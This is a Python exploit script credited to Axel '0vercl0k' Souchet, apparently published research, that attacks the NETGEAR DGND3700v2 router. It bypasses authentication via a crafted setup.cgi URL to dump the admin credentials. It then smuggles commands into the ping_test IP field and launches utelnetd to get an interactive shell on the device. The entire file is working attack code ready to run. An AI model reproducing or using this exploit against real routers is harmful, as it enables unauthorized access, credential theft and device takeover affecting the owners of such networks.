# Axel '0vercl0k' Souchet - 2021
import requests
import re
import threading
import telnetlib
import time
import argparse

def dump_http_pwd(target):
    '''Bypass authentication and retrieve credentials needed to access
    the administration panel.'''
    r = requests.get(f'http://{target}/setup.cgi?next_file=passwordrecovered.htm&foo=currentsetting.htm')
    content = r.content.decode()
    login, pwd = re.findall(r'Router Admin (?:Username|Password)</span>:&nbsp;(.+)</td>', content)
    return login, pwd

def cmd_exec(target, cmd, silent = False):
    '''Bypass authentication and command inject `cmd`.'''
    r = requests.post(
        f'http://{target}/setup.cgi?id=0&sp=1337foo=currentsetting.htm', {
        'todo' : 'ping_test',
        'c4_IPAddr' : f'127.0.0.1 && echo SNIPME && {cmd}',
        'next_file' : 'diagping.htm'
    })

    content = r.content.decode()
    ping_log = re.findall(
        r'<textarea name="ping_result" .+ readonly >(.+)</textarea>',
        content,
        re.DOTALL
    )
    _, cmd_content = ping_log[0].split('SNIPME', 1)
    if not silent:
        print(cmd_content.strip())

def spawn_telnetd(target):
    '''Spawn the telnet server.'''
    cmd_exec(target, '/bin/utelnetd', silent = True)

def main():
    parser = argparse.ArgumentParser('Longue vue')
    parser.add_argument('--dump-pwd', action = 'store_true', default = False)
    parser.add_argument('--shell', action = 'store_true', default = False)
    parser.add_argument('--cmd')
    parser.add_argument('--target', default = 'routerlogin.com')
    args = parser.parse_args()

    # ASCII-art credit goes to David Riley from https://ascii.co.uk/art/telescope. 
    print('''
           .    '                   .  "   '
                  .  .  .                 '      '
          "`       .   .
                                           '     '
        .    '      _______________
                ==c(___(o(______(_()
                        \=\\
                         )=\\
                        //|\\\\
                       //|| \\\\
                      // ||  \\\\
                     //  ||   \\\\
                    //         \\\\
    «Longue vue» LAN exploit targeting NETGEAR DGND3700v2
              by Axel '0vercl0k' Souchet
    ''')
    if not args.dump_pwd and not args.shell and not args.cmd:
        parser.print_help()
        return

    if args.dump_pwd:
        print('Dumping administration password...')
        login, pwd = dump_http_pwd(args.target)
        print(f'Login: {repr(login)}, Password: {repr(pwd)}')

    if args.cmd is not None:
        if '-' in args.cmd or ';' in args.cmd:
            print('Both "-" and ";" are disallowed by the command injection bug, use the shell instead.')
            return

        print(f'Executing {repr(args.cmd)} against {args.target}..')
        cmd_exec(args.target, args.cmd)

    if args.shell:
        print(f'Getting a shell against {args.target}..')
        telnetd = threading.Thread(target = spawn_telnetd, args = (args.target, ))
        telnetd.start()
        print('Waiting a few seconds before connecting..')
        time.sleep(5)
        print('Dropping in the shell, exit with ctrl+c')
        try:
            with telnetlib.Telnet(args.target) as tn:
                tn.mt_interact()
        except:
            pass

        print('Cleaning up..')
        cmd_exec(args.target, '/bin/kill $(/bin/pidof utelnetd)', silent = True)
        print('Joining..')
        telnetd.join()

    print('Done'.center(60, '-'))

main()